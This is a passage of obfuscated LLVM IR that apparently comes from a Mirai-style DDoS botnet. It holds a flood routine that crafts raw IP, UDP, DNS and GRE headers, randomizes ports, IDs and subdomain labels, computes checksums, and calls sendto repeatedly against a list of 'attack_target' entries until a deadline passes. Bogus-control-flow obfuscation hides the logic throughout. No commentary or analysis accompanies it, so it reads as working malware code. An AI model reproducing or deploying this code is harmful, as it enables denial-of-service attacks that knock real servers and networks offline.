  %149 = and i8 %148, 15
  %150 = or i8 %149, 64
  store i8 %150, i8* %147, align 4
  %151 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %152 = bitcast %struct.iphdr* %151 to i8*
  %153 = load i8, i8* %152, align 4
  %154 = and i8 %153, -16
  %155 = or i8 %154, 5
  store i8 %155, i8* %152, align 4
  %156 = load i8, i8* %14, align 1
  %157 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %158 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %157, i32 0, i32 1
  store i8 %156, i8* %158, align 1
  %159 = load i8, i8* %21, align 1
  %160 = zext i8 %159 to i64
  %161 = add i64 41, %160
  %162 = add i64 %161, 2
  %163 = load i32, i32* %23, align 4
  %164 = sext i32 %163 to i64
  %165 = add i64 %162, %164
  %166 = add i64 %165, 4
  %167 = trunc i64 %166 to i16
  %168 = call zeroext i16 @htons(i16 zeroext %167) #7
  %169 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %170 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %169, i32 0, i32 2
  store i16 %168, i16* %170, align 2
  %171 = load i16, i16* %15, align 2
  %172 = call zeroext i16 @htons(i16 zeroext %171) #7
  %173 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %174 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %173, i32 0, i32 3
  store i16 %172, i16* %174, align 4
  %175 = load i8, i8* %16, align 1
  %176 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %177 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %176, i32 0, i32 5
  store i8 %175, i8* %177, align 4
  %178 = load i8, i8* %17, align 1
  %179 = icmp ne i8 %178, 0
  br i1 %179, label %180, label %200

; <label>:180:                                    ; preds = %125
  %181 = load i32, i32* @x.33
  %182 = load i32, i32* @y.34
  %183 = sub i32 %181, 1
  %184 = mul i32 %181, %183
  %185 = urem i32 %184, 2
  %186 = icmp eq i32 %185, 0
  %187 = icmp slt i32 %182, 10
  %188 = or i1 %186, %187
  br i1 %188, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %180
  %189 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %190 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %191 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %190, i32 0, i32 4
  store i16 %189, i16* %191, align 2
  %192 = load i32, i32* @x.33
  %193 = load i32, i32* @y.34
  %194 = sub i32 %192, 1
  %195 = mul i32 %192, %194
  %196 = urem i32 %195, 2
  %197 = icmp eq i32 %196, 0
  %198 = icmp slt i32 %193, 10
  %199 = or i1 %197, %198
  br i1 %199, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %200

; <label>:200:                                    ; preds = %originalBBpart24, %125
  %201 = load i32, i32* @x.33
  %202 = load i32, i32* @y.34
  %203 = sub i32 %201, 1
  %204 = mul i32 %201, %203
  %205 = urem i32 %204, 2
  %206 = icmp eq i32 %205, 0
  %207 = icmp slt i32 %202, 10
  %208 = or i1 %206, %207
  br i1 %208, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %200
  %209 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %210 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %209, i32 0, i32 6
  store i8 17, i8* %210, align 1
  %211 = load i32, i32* @LOCAL_ADDR, align 4
  %212 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %213 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %212, i32 0, i32 8
  store i32 %211, i32* %213, align 4
  %214 = load i32, i32* %24, align 4
  %215 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %216 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %215, i32 0, i32 9
  store i32 %214, i32* %216, align 4
  %217 = load i16, i16* %18, align 2
  %218 = call zeroext i16 @htons(i16 zeroext %217) #7
  %219 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %220 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %219, i32 0, i32 0
  store i16 %218, i16* %220, align 2
  %221 = load i16, i16* %19, align 2
  %222 = call zeroext i16 @htons(i16 zeroext %221) #7
  %223 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %224 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %223, i32 0, i32 1
  store i16 %222, i16* %224, align 2
  %225 = load i8, i8* %21, align 1
  %226 = zext i8 %225 to i64
  %227 = add i64 21, %226
  %228 = add i64 %227, 2
  %229 = load i32, i32* %23, align 4
  %230 = sext i32 %229 to i64
  %231 = add i64 %228, %230
  %232 = add i64 %231, 4
  %233 = trunc i64 %232 to i16
  %234 = call zeroext i16 @htons(i16 zeroext %233) #7
  %235 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %236 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %235, i32 0, i32 2
  store i16 %234, i16* %236, align 2
  %237 = load i16, i16* %20, align 2
  %238 = call zeroext i16 @htons(i16 zeroext %237) #7
  %239 = load %struct.dnshdr*, %struct.dnshdr** %31, align 8
  %240 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %239, i32 0, i32 0
  store i16 %238, i16* %240, align 2
  %241 = call zeroext i16 @htons(i16 zeroext 256) #7
  %242 = load %struct.dnshdr*, %struct.dnshdr** %31, align 8
  %243 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %242, i32 0, i32 1
  store i16 %241, i16* %243, align 2
  %244 = call zeroext i16 @htons(i16 zeroext 1) #7
  %245 = load %struct.dnshdr*, %struct.dnshdr** %31, align 8
  %246 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %245, i32 0, i32 2
  store i16 %244, i16* %246, align 2
  %247 = load i8, i8* %21, align 1
  %248 = load i8*, i8** %32, align 8
  %249 = getelementptr inbounds i8, i8* %248, i32 1
  store i8* %249, i8** %32, align 8
  store i8 %247, i8* %248, align 1
  %250 = load i8, i8* %21, align 1
  %251 = zext i8 %250 to i32
  %252 = load i8*, i8** %32, align 8
  %253 = sext i32 %251 to i64
  %254 = getelementptr inbounds i8, i8* %252, i64 %253
  store i8* %254, i8** %32, align 8
  %255 = load i8*, i8** %32, align 8
  store i8* %255, i8** %33, align 8
  %256 = load i8*, i8** %32, align 8
  %257 = getelementptr inbounds i8, i8* %256, i64 1
  %258 = load i8*, i8** %22, align 8
  %259 = load i32, i32* %23, align 4
  %260 = add nsw i32 %259, 1
  call void @util_memcpy(i8* %257, i8* %258, i32 %260)
  store i32 0, i32* %26, align 4
  %261 = load i32, i32* @x.33
  %262 = load i32, i32* @y.34
  %263 = sub i32 %261, 1
  %264 = mul i32 %261, %263
  %265 = urem i32 %264, 2
  %266 = icmp eq i32 %265, 0
  %267 = icmp slt i32 %262, 10
  %268 = or i1 %266, %267
  br i1 %268, label %originalBBpart246, label %originalBB6alteredBB

originalBBpart246:                                ; preds = %originalBB6
  br label %269

; <label>:269:                                    ; preds = %311, %originalBBpart246
  %270 = load i32, i32* %26, align 4
  %271 = load i32, i32* %23, align 4
  %272 = icmp slt i32 %270, %271
  br i1 %272, label %273, label %314

; <label>:273:                                    ; preds = %269
  %274 = load i32, i32* @x.33
  %275 = load i32, i32* @y.34
  %276 = sub i32 %274, 1
  %277 = mul i32 %274, %276
  %278 = urem i32 %277, 2
  %279 = icmp eq i32 %278, 0
  %280 = icmp slt i32 %275, 10
  %281 = or i1 %279, %280
  br i1 %281, label %originalBB48, label %originalBB48alteredBB

originalBB48:                                     ; preds = %originalBB48alteredBB, %273
  %282 = load i8*, i8** %22, align 8
  %283 = load i32, i32* %26, align 4
  %284 = sext i32 %283 to i64
  %285 = getelementptr inbounds i8, i8* %282, i64 %284
  %286 = load i8, i8* %285, align 1
  %287 = sext i8 %286 to i32
  %288 = icmp eq i32 %287, 46
  %289 = load i32, i32* @x.33
  %290 = load i32, i32* @y.34
  %291 = sub i32 %289, 1
  %292 = mul i32 %289, %291
  %293 = urem i32 %292, 2
  %294 = icmp eq i32 %293, 0
  %295 = icmp slt i32 %290, 10
  %296 = or i1 %294, %295
  br i1 %296, label %originalBBpart250, label %originalBB48alteredBB

originalBBpart250:                                ; preds = %originalBB48
  br i1 %288, label %297, label %307

; <label>:297:                                    ; preds = %originalBBpart250
  %298 = load i8, i8* %27, align 1
  %299 = load i8*, i8** %33, align 8
  store i8 %298, i8* %299, align 1
  store i8 0, i8* %27, align 1
  %300 = load i8, i8* %28, align 1
  %301 = add i8 %300, 1
  store i8 %301, i8* %28, align 1
  %302 = load i8*, i8** %32, align 8
  %303 = load i32, i32* %26, align 4
  %304 = sext i32 %303 to i64
  %305 = getelementptr inbounds i8, i8* %302, i64 %304
  %306 = getelementptr inbounds i8, i8* %305, i64 1
  store i8* %306, i8** %33, align 8
  br label %310

; <label>:307:                                    ; preds = %originalBBpart250
  %308 = load i8, i8* %27, align 1
  %309 = add i8 %308, 1
  store i8 %309, i8* %27, align 1
  br label %310

; <label>:310:                                    ; preds = %307, %297
  br label %311

; <label>:311:                                    ; preds = %310
  %312 = load i32, i32* %26, align 4
  %313 = add nsw i32 %312, 1
  store i32 %313, i32* %26, align 4
  br label %269

; <label>:314:                                    ; preds = %269
  %315 = load i8, i8* %27, align 1
  %316 = load i8*, i8** %33, align 8
  store i8 %315, i8* %316, align 1
  %317 = load i8*, i8** %32, align 8
  %318 = load i32, i32* %23, align 4
  %319 = sext i32 %318 to i64
  %320 = getelementptr inbounds i8, i8* %317, i64 %319
  %321 = getelementptr inbounds i8, i8* %320, i64 2
  %322 = bitcast i8* %321 to %struct.grehdr*
  store %struct.grehdr* %322, %struct.grehdr** %34, align 8
  %323 = call zeroext i16 @htons(i16 zeroext 1) #7
  %324 = load %struct.grehdr*, %struct.grehdr** %34, align 8
  %325 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %324, i32 0, i32 0
  store i16 %323, i16* %325, align 2
  %326 = call zeroext i16 @htons(i16 zeroext 1) #7
  %327 = load %struct.grehdr*, %struct.grehdr** %34, align 8
  %328 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %327, i32 0, i32 1
  store i16 %326, i16* %328, align 2
  br label %329

; <label>:329:                                    ; preds = %314
  %330 = load i32, i32* @x.33
  %331 = load i32, i32* @y.34
  %332 = sub i32 %330, 1
  %333 = mul i32 %330, %332
  %334 = urem i32 %333, 2
  %335 = icmp eq i32 %334, 0
  %336 = icmp slt i32 %331, 10
  %337 = or i1 %335, %336
  br i1 %337, label %originalBB52, label %originalBB52alteredBB

originalBB52:                                     ; preds = %originalBB52alteredBB, %329
  %338 = load i32, i32* %11, align 4
  %339 = add nsw i32 %338, 1
  store i32 %339, i32* %11, align 4
  %340 = load i32, i32* @x.33
  %341 = load i32, i32* @y.34
  %342 = sub i32 %340, 1
  %343 = mul i32 %340, %342
  %344 = urem i32 %343, 2
  %345 = icmp eq i32 %344, 0
  %346 = icmp slt i32 %341, 10
  %347 = or i1 %345, %346
  br i1 %347, label %originalBBpart256, label %originalBB52alteredBB

originalBBpart256:                                ; preds = %originalBB52
  br label %120

; <label>:348:                                    ; preds = %120
  br label %349

; <label>:349:                                    ; preds = %originalBBpart292, %348
  store i32 0, i32* %11, align 4
  br label %350

; <label>:350:                                    ; preds = %originalBBpart288, %349
  %351 = load i32, i32* @x.33
  %352 = load i32, i32* @y.34
  %353 = sub i32 %351, 1
  %354 = mul i32 %351, %353
  %355 = urem i32 %354, 2
  %356 = icmp eq i32 %355, 0
  %357 = icmp slt i32 %352, 10
  %358 = or i1 %356, %357
  br i1 %358, label %originalBB58, label %originalBB58alteredBB

originalBB58:                                     ; preds = %originalBB58alteredBB, %350
  %359 = load i32, i32* %11, align 4
  %360 = load i8, i8* %7, align 1
  %361 = zext i8 %360 to i32
  %362 = icmp slt i32 %359, %361
  %363 = load i32, i32* @x.33
  %364 = load i32, i32* @y.34
  %365 = sub i32 %363, 1
  %366 = mul i32 %363, %365
  %367 = urem i32 %366, 2
  %368 = icmp eq i32 %367, 0
  %369 = icmp slt i32 %364, 10
  %370 = or i1 %368, %369
  br i1 %370, label %originalBBpart260, label %originalBB58alteredBB

originalBBpart260:                                ; preds = %originalBB58
  br i1 %362, label %371, label %551

; <label>:371:                                    ; preds = %originalBBpart260
  %372 = load i32, i32* @x.33
  %373 = load i32, i32* @y.34
  %374 = sub i32 %372, 1
  %375 = mul i32 %372, %374
  %376 = urem i32 %375, 2
  %377 = icmp eq i32 %376, 0
  %378 = icmp slt i32 %373, 10
  %379 = or i1 %377, %378
  br i1 %379, label %originalBB62, label %originalBB62alteredBB

originalBB62:                                     ; preds = %originalBB62alteredBB, %371
  %380 = load i8**, i8*** %13, align 8
  %381 = load i32, i32* %11, align 4
  %382 = sext i32 %381 to i64
  %383 = getelementptr inbounds i8*, i8** %380, i64 %382
  %384 = load i8*, i8** %383, align 8
  store i8* %384, i8** %35, align 8
  %385 = load i8*, i8** %35, align 8
  %386 = bitcast i8* %385 to %struct.iphdr*
  store %struct.iphdr* %386, %struct.iphdr** %36, align 8
  %387 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %388 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %387, i64 1
  %389 = bitcast %struct.iphdr* %388 to %struct.udphdr*
  store %struct.udphdr* %389, %struct.udphdr** %37, align 8
  %390 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %391 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %390, i64 1
  %392 = bitcast %struct.udphdr* %391 to %struct.dnshdr*
  store %struct.dnshdr* %392, %struct.dnshdr** %38, align 8
  %393 = load %struct.dnshdr*, %struct.dnshdr** %38, align 8
  %394 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %393, i64 1
  %395 = bitcast %struct.dnshdr* %394 to i8*
  %396 = getelementptr inbounds i8, i8* %395, i64 1
  store i8* %396, i8** %39, align 8
  %397 = load i16, i16* %15, align 2
  %398 = zext i16 %397 to i32
  %399 = icmp eq i32 %398, 65535
  %400 = load i32, i32* @x.33
  %401 = load i32, i32* @y.34
  %402 = sub i32 %400, 1
  %403 = mul i32 %400, %402
  %404 = urem i32 %403, 2
  %405 = icmp eq i32 %404, 0
  %406 = icmp slt i32 %401, 10
  %407 = or i1 %405, %406
  br i1 %407, label %originalBBpart264, label %originalBB62alteredBB

originalBBpart264:                                ; preds = %originalBB62
  br i1 %399, label %408, label %414

; <label>:408:                                    ; preds = %originalBBpart264
  %409 = call i32 @rand_next()
  %410 = and i32 %409, 65535
  %411 = trunc i32 %410 to i16
  %412 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %413 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %412, i32 0, i32 3
  store i16 %411, i16* %413, align 4
  br label %414

; <label>:414:                                    ; preds = %408, %originalBBpart264
  %415 = load i16, i16* %18, align 2
  %416 = zext i16 %415 to i32
  %417 = icmp eq i32 %416, 65535
  br i1 %417, label %418, label %424

; <label>:418:                                    ; preds = %414
  %419 = call i32 @rand_next()
  %420 = and i32 %419, 65535
  %421 = trunc i32 %420 to i16
  %422 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %423 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %422, i32 0, i32 0
  store i16 %421, i16* %423, align 2
  br label %424

; <label>:424:                                    ; preds = %418, %414
  %425 = load i16, i16* %19, align 2
  %426 = zext i16 %425 to i32
  %427 = icmp eq i32 %426, 65535
  br i1 %427, label %428, label %450

; <label>:428:                                    ; preds = %424
  %429 = load i32, i32* @x.33
  %430 = load i32, i32* @y.34
  %431 = sub i32 %429, 1
  %432 = mul i32 %429, %431
  %433 = urem i32 %432, 2
  %434 = icmp eq i32 %433, 0
  %435 = icmp slt i32 %430, 10
  %436 = or i1 %434, %435
  br i1 %436, label %originalBB66, label %originalBB66alteredBB

originalBB66:                                     ; preds = %originalBB66alteredBB, %428
  %437 = call i32 @rand_next()
  %438 = and i32 %437, 65535
  %439 = trunc i32 %438 to i16
  %440 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %441 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %440, i32 0, i32 1
  store i16 %439, i16* %441, align 2
  %442 = load i32, i32* @x.33
  %443 = load i32, i32* @y.34
  %444 = sub i32 %442, 1
  %445 = mul i32 %442, %444
  %446 = urem i32 %445, 2
  %447 = icmp eq i32 %446, 0
  %448 = icmp slt i32 %443, 10
  %449 = or i1 %447, %448
  br i1 %449, label %originalBBpart275, label %originalBB66alteredBB

originalBBpart275:                                ; preds = %originalBB66
  br label %450

; <label>:450:                                    ; preds = %originalBBpart275, %424
  %451 = load i16, i16* %20, align 2
  %452 = zext i16 %451 to i32
  %453 = icmp eq i32 %452, 65535
  br i1 %453, label %454, label %460

; <label>:454:                                    ; preds = %450
  %455 = call i32 @rand_next()
  %456 = and i32 %455, 65535
  %457 = trunc i32 %456 to i16
  %458 = load %struct.dnshdr*, %struct.dnshdr** %38, align 8
  %459 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %458, i32 0, i32 0
  store i16 %457, i16* %459, align 2
  br label %460

; <label>:460:                                    ; preds = %454, %450
  %461 = load i8*, i8** %39, align 8
  %462 = load i8, i8* %21, align 1
  %463 = zext i8 %462 to i32
  call void @rand_alphastr(i8* %461, i32 %463)
  %464 = load i8*, i8** %39, align 8
  %465 = load i8, i8* %21, align 1
  %466 = zext i8 %465 to i64
  %467 = getelementptr inbounds i8, i8* %464, i64 %466
  store i8 0, i8* %467, align 1
  %468 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %469 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %468, i32 0, i32 7
  store i16 0, i16* %469, align 2
  %470 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %471 = bitcast %struct.iphdr* %470 to i16*
  %472 = call zeroext i16 @checksum_generic(i16* %471, i32 20)
  %473 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %474 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %473, i32 0, i32 7
  store i16 %472, i16* %474, align 2
  %475 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %476 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %475, i32 0, i32 3
  store i16 0, i16* %476, align 2
  %477 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %478 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %479 = bitcast %struct.udphdr* %478 to i8*
  %480 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %481 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %480, i32 0, i32 2
  %482 = load i16, i16* %481, align 2
  %483 = load i8, i8* %21, align 1
  %484 = zext i8 %483 to i64
  %485 = add i64 21, %484
  %486 = add i64 %485, 2
  %487 = load i32, i32* %23, align 4
  %488 = sext i32 %487 to i64
  %489 = add i64 %486, %488
  %490 = add i64 %489, 4
  %491 = trunc i64 %490 to i32
  %492 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %477, i8* %479, i16 zeroext %482, i32 %491)
  %493 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %494 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %493, i32 0, i32 3
  store i16 %492, i16* %494, align 2
  %495 = load i32, i32* %24, align 4
  %496 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %497 = load i32, i32* %11, align 4
  %498 = sext i32 %497 to i64
  %499 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %496, i64 %498
  %500 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %499, i32 0, i32 0
  %501 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %500, i32 0, i32 2
  %502 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %501, i32 0, i32 0
  store i32 %495, i32* %502, align 4
  %503 = load %struct.udphdr*, %struct.udphdr** %37, align 8
  %504 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %503, i32 0, i32 1
  %505 = load i16, i16* %504, align 2
  %506 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %507 = load i32, i32* %11, align 4
  %508 = sext i32 %507 to i64
  %509 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %506, i64 %508
  %510 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %509, i32 0, i32 0
  %511 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %510, i32 0, i32 1
  store i16 %505, i16* %511, align 2
  %512 = load i32, i32* %12, align 4
  %513 = load i8*, i8** %35, align 8
  %514 = load i8, i8* %21, align 1
  %515 = zext i8 %514 to i64
  %516 = add i64 41, %515
  %517 = add i64 %516, 2
  %518 = load i32, i32* %23, align 4
  %519 = sext i32 %518 to i64
  %520 = add i64 %517, %519
  %521 = add i64 %520, 4
  %522 = bitcast %union.__CONST_SOCKADDR_ARG* %40 to %struct.sockaddr**
  %523 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %524 = load i32, i32* %11, align 4
  %525 = sext i32 %524 to i64
  %526 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %523, i64 %525
  %527 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %526, i32 0, i32 0
  %528 = bitcast %struct.sockaddr_in* %527 to %struct.sockaddr*
  store %struct.sockaddr* %528, %struct.sockaddr** %522, align 8
  %529 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %40, i32 0, i32 0
  %530 = load %struct.sockaddr*, %struct.sockaddr** %529, align 8
  %531 = call i64 @sendto(i32 %512, i8* %513, i64 %521, i32 16384, %struct.sockaddr* %530, i32 16)
  br label %532

; <label>:532:                                    ; preds = %460
  %533 = load i32, i32* @x.33
  %534 = load i32, i32* @y.34
  %535 = sub i32 %533, 1
  %536 = mul i32 %533, %535
  %537 = urem i32 %536, 2
  %538 = icmp eq i32 %537, 0
  %539 = icmp slt i32 %534, 10
  %540 = or i1 %538, %539
  br i1 %540, label %originalBB77, label %originalBB77alteredBB

originalBB77:                                     ; preds = %originalBB77alteredBB, %532
  %541 = load i32, i32* %11, align 4
  %542 = add nsw i32 %541, 1
  store i32 %542, i32* %11, align 4
  %543 = load i32, i32* @x.33
  %544 = load i32, i32* @y.34
  %545 = sub i32 %543, 1
  %546 = mul i32 %543, %545
  %547 = urem i32 %546, 2
  %548 = icmp eq i32 %547, 0
  %549 = icmp slt i32 %544, 10
  %550 = or i1 %548, %549
  br i1 %550, label %originalBBpart288, label %originalBB77alteredBB

originalBBpart288:                                ; preds = %originalBB77
  br label %350

; <label>:551:                                    ; preds = %originalBBpart260
  %552 = call i64 @time(i64* null) #6
  %553 = load i32, i32* %25, align 4
  %554 = sext i32 %553 to i64
  %555 = icmp sgt i64 %552, %554
  br i1 %555, label %556, label %557

; <label>:556:                                    ; preds = %551
  br label %574

; <label>:557:                                    ; preds = %551
  %558 = load i32, i32* @x.33
  %559 = load i32, i32* @y.34
  %560 = sub i32 %558, 1
  %561 = mul i32 %558, %560
  %562 = urem i32 %561, 2
  %563 = icmp eq i32 %562, 0
  %564 = icmp slt i32 %559, 10
  %565 = or i1 %563, %564
  br i1 %565, label %originalBB90, label %originalBB90alteredBB

originalBB90:                                     ; preds = %originalBB90alteredBB, %557
  %566 = load i32, i32* @x.33
  %567 = load i32, i32* @y.34
  %568 = sub i32 %566, 1
  %569 = mul i32 %566, %568
  %570 = urem i32 %569, 2
  %571 = icmp eq i32 %570, 0
  %572 = icmp slt i32 %567, 10
  %573 = or i1 %571, %572
  br i1 %573, label %originalBBpart292, label %originalBB90alteredBB

originalBBpart292:                                ; preds = %originalBB90
  br label %349

; <label>:574:                                    ; preds = %556, %116, %110, %originalBBpart2
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %88
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %180
  %575 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %576 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %577 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %576, i32 0, i32 4
  store i16 %575, i16* %577, align 2
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %200
  %578 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %579 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %578, i32 0, i32 6
  store i8 17, i8* %579, align 1
  %580 = load i32, i32* @LOCAL_ADDR, align 4
  %581 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %582 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %581, i32 0, i32 8
  store i32 %580, i32* %582, align 4
  %583 = load i32, i32* %24, align 4
  %584 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %585 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %584, i32 0, i32 9
  store i32 %583, i32* %585, align 4
  %586 = load i16, i16* %18, align 2
  %587 = call zeroext i16 @htons(i16 zeroext %586) #7
  %588 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %589 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %588, i32 0, i32 0
  store i16 %587, i16* %589, align 2
  %590 = load i16, i16* %19, align 2
  %591 = call zeroext i16 @htons(i16 zeroext %590) #7
  %592 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %593 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %592, i32 0, i32 1
  store i16 %591, i16* %593, align 2
  %594 = load i8, i8* %21, align 1
  %595 = zext i8 %594 to i64
  %_ = shl i64 21, %595
  %_7 = sub i64 0, 21
  %gen = add i64 %_7, %595
  %_8 = sub i64 21, %595
  %gen9 = mul i64 %_8, %595
  %_10 = sub i64 21, %595
  %gen11 = mul i64 %_10, %595
  %_12 = shl i64 21, %595
  %_13 = sub i64 21, %595
  %gen14 = mul i64 %_13, %595
  %_15 = sub i64 0, 21
  %gen16 = add i64 %_15, %595
  %596 = add i64 21, %595
  %_17 = shl i64 %596, 2
  %_18 = sub i64 0, %596
  %gen19 = add i64 %_18, 2
  %_20 = sub i64 0, %596
  %gen21 = add i64 %_20, 2
  %597 = add i64 %596, 2
  %598 = load i32, i32* %23, align 4
  %599 = sext i32 %598 to i64
  %_22 = sub i64 %597, %599
  %gen23 = mul i64 %_22, %599
  %_24 = sub i64 %597, %599
  %gen25 = mul i64 %_24, %599
  %_26 = shl i64 %597, %599
  %_27 = sub i64 %597, %599
  %gen28 = mul i64 %_27, %599
  %600 = add i64 %597, %599
  %_29 = sub i64 0, %600
  %gen30 = add i64 %_29, 4
  %_31 = sub i64 %600, 4
  %gen32 = mul i64 %_31, 4
  %601 = add i64 %600, 4
  %602 = trunc i64 %601 to i16
  %603 = call zeroext i16 @htons(i16 zeroext %602) #7
  %604 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %605 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %604, i32 0, i32 2
  store i16 %603, i16* %605, align 2
  %606 = load i16, i16* %20, align 2
  %607 = call zeroext i16 @htons(i16 zeroext %606) #7
  %608 = load %struct.dnshdr*, %struct.dnshdr** %31, align 8
  %609 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %608, i32 0, i32 0
  store i16 %607, i16* %609, align 2
  %610 = call zeroext i16 @htons(i16 zeroext 256) #7
  %611 = load %struct.dnshdr*, %struct.dnshdr** %31, align 8
  %612 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %611, i32 0, i32 1
  store i16 %610, i16* %612, align 2
  %613 = call zeroext i16 @htons(i16 zeroext 1) #7
  %614 = load %struct.dnshdr*, %struct.dnshdr** %31, align 8
  %615 = getelementptr inbounds %struct.dnshdr, %struct.dnshdr* %614, i32 0, i32 2
  store i16 %613, i16* %615, align 2
  %616 = load i8, i8* %21, align 1
  %617 = load i8*, i8** %32, align 8
  %618 = getelementptr inbounds i8, i8* %617, i32 1
  store i8* %618, i8** %32, align 8
  store i8 %616, i8* %617, align 1
  %619 = load i8, i8* %21, align 1
  %620 = zext i8 %619 to i32
  %621 = load i8*, i8** %32, align 8
  %622 = sext i32 %620 to i64
  %623 = getelementptr inbounds i8, i8* %621, i64 %622
  store i8* %623, i8** %32, align 8
  %624 = load i8*, i8** %32, align 8
  store i8* %624, i8** %33, align 8
  %625 = load i8*, i8** %32, align 8
  %626 = getelementptr inbounds i8, i8* %625, i64 1
  %627 = load i8*, i8** %22, align 8
  %628 = load i32, i32* %23, align 4
  %_33 = sub i32 0, %628
  %gen34 = add i32 %_33, 1
  %_35 = sub i32 %628, 1
  %gen36 = mul i32 %_35, 1
  %_37 = shl i32 %628, 1
  %_38 = sub i32 %628, 1
  %gen39 = mul i32 %_38, 1
  %_40 = sub i32 %628, 1
  %gen41 = mul i32 %_40, 1
  %_42 = sub i32 %628, 1
  %gen43 = mul i32 %_42, 1
  %_44 = shl i32 %628, 1
  %629 = add nsw i32 %628, 1
  call void @util_memcpy(i8* %626, i8* %627, i32 %629)
  store i32 0, i32* %26, align 4
  br label %originalBB6

originalBB48alteredBB:                            ; preds = %originalBB48, %273
  %630 = load i8*, i8** %22, align 8
  %631 = load i32, i32* %26, align 4
  %632 = sext i32 %631 to i64
  %633 = getelementptr inbounds i8, i8* %630, i64 %632
  %634 = load i8, i8* %633, align 1
  %635 = sext i8 %634 to i32
  %636 = icmp eq i32 %635, 46
  br label %originalBB48

originalBB52alteredBB:                            ; preds = %originalBB52, %329
  %637 = load i32, i32* %11, align 4
  %_53 = sub i32 0, %637
  %gen54 = add i32 %_53, 1
  %638 = add nsw i32 %637, 1
  store i32 %638, i32* %11, align 4
  br label %originalBB52

originalBB58alteredBB:                            ; preds = %originalBB58, %350
  %639 = load i32, i32* %11, align 4
  %640 = load i8, i8* %7, align 1
  %641 = zext i8 %640 to i32
